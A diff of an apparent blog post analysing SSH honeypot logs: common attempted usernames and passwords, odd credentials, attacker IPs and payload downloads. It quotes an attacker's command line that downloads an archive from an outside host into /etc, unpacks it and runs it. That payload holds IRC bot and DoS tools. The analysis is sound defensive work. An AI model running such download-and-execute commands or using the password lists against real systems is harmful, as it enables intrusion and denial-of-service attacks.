@@ -33,11 +33,11 @@ The most attempted username was `root`, and sorted by number of attempts, the to
       187 admin
       157 apache
 ```
-    
-It's interesting that `oracle`, `nagios` and `postgres` all appear more frequently than `apache` or `www-data` (which is even further down the list). Could these indicate a general lack of good security practices on some database and monitoring servers? In that case, where's MySQL? 
-    
+
+It's interesting that `oracle`, `nagios` and `postgres` all appear more frequently than `apache` or `www-data` (which is even further down the list). Could these indicate a general lack of good security practices on some database and monitoring servers? In that case, where's MySQL?
+
 Counts of password attempts were spread more evenly than usernames, and the most attempted passwords were `changeme`, `123456` and `password`. The list below shows the top ten:
-    
+
 ```nohighlight
     1661 changeme
     1475 123456
@@ -55,7 +55,7 @@ This really has to be about the worst possible wordlist. In all, the logs contai
 
 ### Strange credentials
 
-I wrote about some of the higher entropy passwords in my last post, highlighting a few of the more interesting strings, but this time some were even more strange. 
+I wrote about some of the higher entropy passwords in my last post, highlighting a few of the more interesting strings, but this time some were even more strange.
 
 Some of the password strings with the highest entropy, according to [Data::Password::Entropy](https://metacpan.org/pod/Data::Password::Entropy) are:
 
@@ -72,9 +72,9 @@ B*(&%^#$SSH?M?a+k3f123!^*backIleSSH@q!@#D
 ortega.123#TradeLinuxKi!l|iN6#Th3h03$%nix@NdR3b!irD
 ```
 
-Bizarre! I find it hard to believe that real-life systems are compromised using these passwords, so I suspect that as I said in my previous post they're either set by other tools, or perhaps they're some sort of strange meme which is gradually propagating through script kiddie's word lists. 
+Bizarre! I find it hard to believe that real-life systems are compromised using these passwords, so I suspect that as I said in my previous post they're either set by other tools, or perhaps they're some sort of strange meme which is gradually propagating through script kiddie's word lists.
 
-I also find the idea that they're '[vanity strings](http://rud.is/b/2012/06/28/honeypot-analytics/)' unlikely, but like the idea that there are thousands of Chinese script kiddies running SSH scanners solely to get into geek's blog posts. 
+I also find the idea that they're '[vanity strings](http://rud.is/b/2012/06/28/honeypot-analytics/)' unlikely, but like the idea that there are thousands of Chinese script kiddies running SSH scanners solely to get into geek's blog posts.
 
 ## Attacker's IPs
 
@@ -99,26 +99,26 @@ I don't think there's anything surprising there.
 
 There wasn't much download activity, which is interesting and probably indicates that lots of SSH scanners just run unattended on large blocks and their owners check the results later. Or it could indicate a lack of realism in my honeypot setup.
 
-Over the entire time the honeypot was running there were 25 downloads in total. Most of these were tarballs of scanning tools, but four of the 25 were cachefly test files and Microsoft service packs. In these cases I think the attackers were probably intending to use the system in DoS attacks, and were using the big downloads to judge available bandwidth. 
+Over the entire time the honeypot was running there were 25 downloads in total. Most of these were tarballs of scanning tools, but four of the 25 were cachefly test files and Microsoft service packs. In these cases I think the attackers were probably intending to use the system in DoS attacks, and were using the big downloads to judge available bandwidth.
 
 Here's an example terminal session:
 
     wget http://cachefly.cachefly.net/100mb.test
     cd /etc; wget http://rootnr1.net76.net/shell.tgz; tar xvf shell.tgz; rm -rf shell.tgz; cd rc.9; chmod +x *
     ./go
-    
-… at this point kippo starts playing games with the user and they invariably log off but I still have the files to play with. In this case, the payload contains several shell and perl scripts and a lot of pre-compiled binaries, all of which are unpacked into a directory called `rc.9`.     
+
+… at this point kippo starts playing games with the user and they invariably log off but I still have the files to play with. In this case, the payload contains several shell and perl scripts and a lot of pre-compiled binaries, all of which are unpacked into a directory called `rc.9`.  
 
 The perl scripts include [Hawker Hunter v2.0](http://pastebin.com/HVpaBr9u), an IRC bot with port scanning and DoS capabilities and another DoS tool which contains the string "GlobaL Team atack victim" (sic).
 
 Running strings on the binaries reveals some interesting, if dated things. For example, one of the files `h` contains:
 
     Hide - Process Faker, by Schizoprenic Xnuxer Research (c) 2002
-    
+
 And another `stream` contains:
 
     stream.c v1.0 - TCP Packet Storm
-    
+
 Which, according to [this mailing list post](http://packetstormsecurity.com/files/10836/stream-dos.txt.html) from 2000 might exploit an old DoS vulnerability in FreeBSD, Solaris and Linux. It's not clear to me if this is still relevant on modern systems, and if not this payload could have been around for ages. In fact, one of the most noticeable aspects of the payloads I saw was their age; everything's old!.
 
 ## Shall we play a game?
